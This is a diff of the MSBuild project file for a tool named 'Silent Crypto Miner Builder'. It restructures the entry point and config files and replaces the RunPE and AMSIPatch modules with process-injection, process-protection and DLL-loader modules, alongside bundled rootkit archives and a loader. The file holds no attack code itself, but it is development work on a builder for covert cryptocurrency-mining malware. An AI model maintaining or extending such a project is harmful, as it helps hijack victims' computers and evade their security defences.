@@ -6,7 +6,7 @@
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{CE2307EB-A69E-0EB9-386C-D322223A10A9}</ProjectGuid>
     <OutputType>WinExe</OutputType>
-    <StartupObject>SilentCryptoMiner.My.MyApplication</StartupObject>
+    <StartupObject>SilentCryptoMiner.Entrypoint</StartupObject>
     <RootNamespace>SilentCryptoMiner</RootNamespace>
     <AssemblyName>Silent Crypto Miner Builder</AssemblyName>
     <FileAlignment>512</FileAlignment>
@@ -50,7 +50,8 @@
     <DefineTrace>true</DefineTrace>
     <Optimize>true</Optimize>
     <OutputPath>bin\Release\</OutputPath>
-    <DocumentationFile>bin\Release\Silent Crypto Miner Builder.xml</DocumentationFile>
+    <DocumentationFile>
+    </DocumentationFile>
     <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022,1591</NoWarn>
     <Prefer32Bit>false</Prefer32Bit>
   </PropertyGroup>
@@ -156,32 +157,23 @@
     <Compile Include="Forms\MinerXMR.cs">
       <SubType>Form</SubType>
     </Compile>
-    <Compile Include="My Project\Application.Designer.cs" />
-    <Compile Include="My Project\AssemblyInfo.cs" />
-    <Compile Include="My Project\MyNamespace.Dynamic.Designer.cs" />
-    <Compile Include="My Project\MyNamespace.Static.1.Designer.cs" />
-    <Compile Include="My Project\MyNamespace.Static.2.Designer.cs" />
-    <Compile Include="My Project\MyNamespace.Static.3.Designer.cs" />
-    <Compile Include="My Project\Settings.Designer.cs">
-      <AutoGen>True</AutoGen>
-      <DependentUpon>Settings.settings</DependentUpon>
-      <DesignTimeSharedInput>True</DesignTimeSharedInput>
-    </Compile>
+    <Compile Include="Program\AssemblyInfo.cs" />
     <Compile Include="Properties\Resources.Designer.cs">
       <AutoGen>True</AutoGen>
       <DesignTime>True</DesignTime>
       <DependentUpon>Resources.resx</DependentUpon>
     </Compile>
-    <Content Include="Resources\Code\Checker.cs" />
+    <None Include="Resources\Code\Checker.cs" />
     <Content Include="Resources\LocalizedControls.xml" />
-    <None Include="Resources\Modules\RunPE.dll" />
-    <None Include="Resources\Modules\AMSIPatch.dll" />
+    <None Include="Resources\Modules\ProcessProtect.dll" />
+    <None Include="Resources\Modules\ProcessInject.dll" />
+    <None Include="Resources\Modules\DllLoader.dll" />
     <None Include="Resources\Compilers\resource.rcf" />
     <None Include="Resources\Compilers\template.manifest-miner" />
     <None Include="Resources\Rootkit\rootkit-i.zip" />
     <None Include="Resources\Rootkit\rootkit-u.zip" />
-    <None Include="app.config" />
-    <None Include="My Project\app.manifest">
+    <None Include="Program\app.config" />
+    <None Include="Program\app.manifest">
       <SubType>Designer</SubType>
     </None>
     <None Include="Resources\Compilers\Compilers.zip" />
@@ -194,6 +186,7 @@
   <ItemGroup>
     <EmbeddedResource Include="Forms\AdvancedOptions.resx">
       <DependentUpon>AdvancedOptions.cs</DependentUpon>
+      <SubType>Designer</SubType>
     </EmbeddedResource>
     <EmbeddedResource Include="Forms\AlgorithmSelection.resx">
       <DependentUpon>AlgorithmSelection.cs</DependentUpon>
@@ -213,13 +206,6 @@
       <SubType>Designer</SubType>
       <LastGenOutput>Resources.Designer.cs</LastGenOutput>
     </EmbeddedResource>
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="My Project\Settings.settings">
-      <Generator>SettingsSingleFileGenerator</Generator>
-      <CustomToolNamespace>SilentCryptoMiner.My</CustomToolNamespace>
-      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
-    </None>
   </ItemGroup>
   <ItemGroup>
     <None Include="Resources\Images\Monero.png" />
@@ -248,8 +234,10 @@
     <None Include="Resources\Images\icon.png" />
     <None Include="Resources\Images\icon.ico" />
     <None Include="Resources\Code\Loader.c" />
-    <Content Include="Resources\Code\Uninstaller.cs" />
+    <None Include="Resources\Code\Uninstaller.cs" />
   </ItemGroup>
-  <ItemGroup />
+  <ItemGroup>
+    <Compile Include="Program\Entrypoint.cs" />
+  </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
